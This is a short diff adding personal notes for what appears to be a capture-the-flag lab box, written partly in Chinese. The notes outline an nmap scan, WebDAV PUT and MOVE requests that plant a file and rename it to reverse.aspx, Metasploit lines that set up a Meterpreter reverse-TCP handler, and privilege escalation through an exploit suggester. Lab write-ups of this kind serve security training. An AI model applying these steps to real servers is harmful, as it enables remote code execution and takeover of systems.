@@ -1,0 +1,16 @@
+
+nmap  -sC -sV   10.129.108.225 -Pn > nmap.txt
+
+
+MOVE /pub2/folder1/ HTTP/1
+Destination: http://www.contoso.com/pub2/folder2/
+Host: www.contoso.com
+
+use multie/handler
+set payload windows/meterpreter/reverse_tcp
+
+1.nmap查找到80端口試iis httpd6
+2.找到有davtest -url http://10.129.62.67 可使用put方法上傳文檔
+3.burp抓取請求,put上傳reverse.html 在用move方法將reverse.html改為reverse.aspx
+4.使用msfconsole起meterpreter設置hadler及payload,執行aspx取得reverse.shell
+5.search suggest 使用 建議的提權限方式題權
